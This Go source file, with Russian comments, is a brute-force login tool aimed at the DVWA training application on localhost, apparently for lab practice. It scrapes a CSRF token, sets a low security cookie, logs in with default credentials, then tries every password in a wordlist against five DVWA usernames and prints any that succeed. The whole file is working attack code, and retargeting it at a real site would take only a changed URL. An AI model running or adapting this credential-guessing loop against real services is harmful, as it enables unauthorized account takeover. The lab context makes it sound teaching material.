package main

import (
	"bufio"
	"fmt"
	"io"
	"net/http"
	"net/http/cookiejar"
	"net/url"
	"os"
	"regexp"
	"strings"
)

var BaseURLSchema = &url.URL{
	Scheme: "http",
	Host:   "127.0.0.1:4280",
}

var usernames = []string{"admin", "gordonb", "1337", "pablo", "smithy"}

var bruteforceURL = "http://127.0.0.1:4280/vulnerabilities/brute/"
var loginURL = "http://127.0.0.1:4280/login.php"

func openPasswordFile() (*os.File, error) {
	passwordsFile := "passwords.txt"

	file, err := os.Open(passwordsFile)
	if err != nil {
		fmt.Println("Ошибка открытия файла:", err)
		return nil, err
	}
	
	return file, err;
}

func setup(client *http.Client) (string, error) {
	client.CheckRedirect = func(req *http.Request, via []*http.Request) error {
		return http.ErrUseLastResponse // Вернуть эту ошибку, чтобы клиент не следовал за редиректом
	}

	security_cookie := &http.Cookie{Name: "security", Value: "low"}

	client.Jar.SetCookies(BaseURLSchema, []*http.Cookie{security_cookie})

	loginPageRequest, err := http.NewRequest("GET", loginURL, nil)
	if err != nil {
		return "", err
	}

	loginPageRequest.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")

	loginPageResponse, err := client.Do(loginPageRequest)
	if err != nil {
		return "", err
	}
	defer loginPageResponse.Body.Close()

	fmt.Println(client.Jar.Cookies(BaseURLSchema))

	loginPageHTML, err := io.ReadAll(loginPageResponse.Body)
	if err != nil {
		return "", err
	}

	userTokenRegexp := regexp.MustCompile(`<input\s+type=['"]hidden['"]\s+name=['"]user_token['"]\s+value=['"]([^'"]+)['"]\s*/?>`)
	
	match := userTokenRegexp.FindStringSubmatch(string(loginPageHTML))

	if len(match) < 1 {
		return "", fmt.Errorf("UserToken не найден")
	}

	userToken := match[1]

	data := url.Values{}
	data.Set("username", "admin")
	data.Set("password", "password")
	data.Set("Login", "Login")
	data.Set("user_token", userToken)

	// Создаем новый POST-запрос
	req, err := http.NewRequest("POST", loginURL, strings.NewReader(data.Encode()))
	if err != nil {
		return "", err
	}

	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")

	resp, err := client.Do(req)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()

	// body, err := io.ReadAll(resp.Body)
	// if err != nil {
	// 	return err
	// }

	return userToken, nil;
}

func main() {
	jar, err := cookiejar.New(nil)

	if err != nil {
		fmt.Println("Ошибка инициализации cookiejar: ", err)
		return
	}

	client := &http.Client{
		Jar: jar,
	}

	userToken, err := setup(client);

	if (err != nil) {
		return
	}

	file, err := openPasswordFile()

	if (err != nil) {
		return
	}

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		password := scanner.Text()

		for _, username := range usernames {
			success, err := tryLogin(client, userToken, username, password)
			if err != nil {
				fmt.Println("Ошибка при попытке авторизации для пользователя", username, ":", err)
				continue
			}

			if success {
				fmt.Println("Пароль для пользователя", username, "найден:", password)
				return
			} else {
				fmt.Println("Неправильный пароль для пользователя", username, ":", password)
			}
		}
	}

	if err := scanner.Err(); err != nil {
		fmt.Println("Ошибка чтения файла:", err)
	}
}

func tryLogin(client *http.Client, userToken, username, password string) (bool, error) {
	params := url.Values{}
	params.Set("username", username)
	params.Set("password", password)
	params.Set("Login", "Login")

	fullURL := fmt.Sprintf("%s?%s#", bruteforceURL, params.Encode())
	req, err := http.NewRequest("GET", fullURL, nil)
	if err != nil {
		return false, err
	}

	req.Header.Set("User-Agent", "Mozilla/5.0 (compatible)")

	resp, err := client.Do(req)
	if err != nil {
		return false, err
	}
	defer resp.Body.Close()

	body, err := io.ReadAll(resp.Body)
	if err != nil {
		return false, err
	}

	if strings.Contains(string(body), "Welcome") {
		return true, nil
	}

	return false, nil
}

